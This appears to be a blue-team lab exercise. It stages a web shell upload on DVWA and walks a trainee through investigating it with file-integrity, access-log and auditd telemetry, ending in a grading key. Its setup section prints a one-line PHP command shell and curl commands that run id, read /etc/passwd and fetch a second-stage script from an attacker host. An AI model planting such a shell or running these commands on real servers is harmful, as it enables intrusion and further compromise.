# S03 — Web Shell Upload on DVWA

**Tier 2 · ATT&CK: T1190 (Exploit Public-Facing App), T1505.003 (Web Shell)**

## Story
`vic-lin` runs a vulnerable web app (DVWA). A new `.php` file appeared in the web root and someone's been talking to it. When did it land, how, and what did they run through it?

## Lab setup
- DVWA on `vic-lin` (nginx/apache + php + mysql), security set to *low* for the upload path.
- **Wazuh FIM** watching the web root:
  ```xml
  <syscheck><directories check_all="yes" realtime="yes">/var/www/html</directories></syscheck>
  ```
- auditd `exec` key on to catch commands the shell spawns.

## Run it
From `kali`: log into DVWA, use the **File Upload** module to drop a minimal shell:
```php
<?php system($_GET['c']); ?>
```
Then drive it (randomize the commands and timing):
```bash
curl 'http://10.10.10.20/hackable/uploads/sh.php?c=id'
curl 'http://10.10.10.20/hackable/uploads/sh.php?c=cat+/etc/passwd'
curl 'http://10.10.10.20/hackable/uploads/sh.php?c=wget+http://10.10.10.5/lin-persist.sh'
```

## Cleanup / revert
Revert to `baseline`.

## What telemetry this generates
- **FIM**: real-time "file added" alert for `sh.php` in the upload dir, timestamped and with a hash.
- **Web access log**: the `POST` that uploaded it, then `GET ...sh.php?c=...` lines exposing every command as a URL parameter.
- **auditd**: `id`, `cat`, `wget` executed by the `www-data` user. A web server spawning a shell is the tell.

## Your investigation (fill cold)
When did the shell file appear (FIM) and does that line up with a POST in the access log? What commands ran through it (decode the `c=` params)? Did the attacker pull a second-stage file? Is `www-data` executing shell commands, and would you have caught that without FIM? Confidence on "web shell, actively used": high or low, and why.

## Detection engineering
Correlate a FIM "file created in web root" with the same file being requested via GET within minutes, or an auditd rule flagging `www-data` spawning `sh`/`wget`/`curl`. Either one is a solid web-shell detection. Ship it.

<details>
<summary>Grading key: don't open until your verdict is written</summary>

- Sealed truth: the shell filename, the upload timestamp, the exact `c=` command sequence, and whether a second stage was fetched.
- **Good:** you tie the FIM create, the upload POST, and the command GETs into one timeline, decode every `c=` param, and flag the `www-data`-to-shell execution as the smoking gun. Bonus for the hash of the shell and the second-stage URL.
- **Miss:** seeing the FIM alert but never reading the access log to learn what the shell did. The file appearing is initial access. The case is the hands-on-keyboard activity that followed.
</details>
